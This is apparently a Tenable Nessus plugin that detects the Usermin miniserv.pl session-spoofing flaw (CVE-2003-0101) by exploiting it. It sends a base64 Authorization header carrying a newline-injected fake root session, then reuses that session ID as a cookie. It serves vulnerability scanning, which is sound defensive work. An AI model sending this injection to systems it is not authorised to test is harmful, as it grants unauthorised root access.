#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(11280);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_cve_id("CVE-2003-0101");
  script_bugtraq_id(6915);
  script_osvdb_id(10803);

  script_name(english:"Usermin 'miniserv.pl' Base-64 String Metacharacter Handling Session Spoofing");
  script_summary(english:"Spoofs a session ID.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a Session ID
spoofing vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote server is running a version of Usermin which is vulnerable
to Session ID spoofing. An attacker may use this flaw to log in as the
'root' user, and gain full control of the remote host.");
  script_set_attribute(attribute:"solution", value:"Upgrade to Usermin 1.000 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2003/02/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2003/02/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/02/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:webmin:usermin");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:usermin:usermin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2015 Tenable Network Security, Inc.");

  script_dependencie("usermin_detect.nbin");
  script_require_keys("www/usermin");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/www", 20000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

app = "Usermin";
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_http_port(default:20000, embedded:TRUE);
get_kb_item_or_exit('www/'+port+'/usermin');

dir = '/';
install_url = build_url(port:port, qs:dir);

init_cookiejar();
set_http_cookie(name:"testing", value:"1");

r = http_send_recv3(
  method : "GET",
  item   : dir,
  port   : port,
  add_headers : make_array("User-Agent", "webmin", "Authorization","Basic YSBhIDEKbmV3IDEyMzQ1Njc4OTAgcm9vdDpwYXNzd29yZA=="),
  exit_on_fail : TRUE
);
req1 = http_last_sent_request();

if (
  (ereg(pattern:"^HTTP/[0-9]\.[0-9] 401 ", string:r[0])) ||
  (!egrep(pattern:".*session_login\.cgi\?logout=1.*", string:r[2]))
)
{
  set_http_cookie(name:"testing", value:"1");
  set_http_cookie(name:"usid", value:"1234567890");
  set_http_cookie(name:"user", value:"x");
  r = http_send_recv3(method: "GET", item:dir, port:port, exit_on_fail:TRUE);

  #
  # I'm afraid of localizations, so I grep on the HTML source code,
  # not the message status.
  #
  if (egrep(pattern:".*session_login\.cgi\?logout=1.*", string:r[2]))
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' + 'Nessus was able to exploit this issue with the following pair of' +
        '\n' + 'requests : '+
        '\n' + 
        '\n' + req1 + 
        '\n' + 
        '\n' + http_last_sent_request() + 
        '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
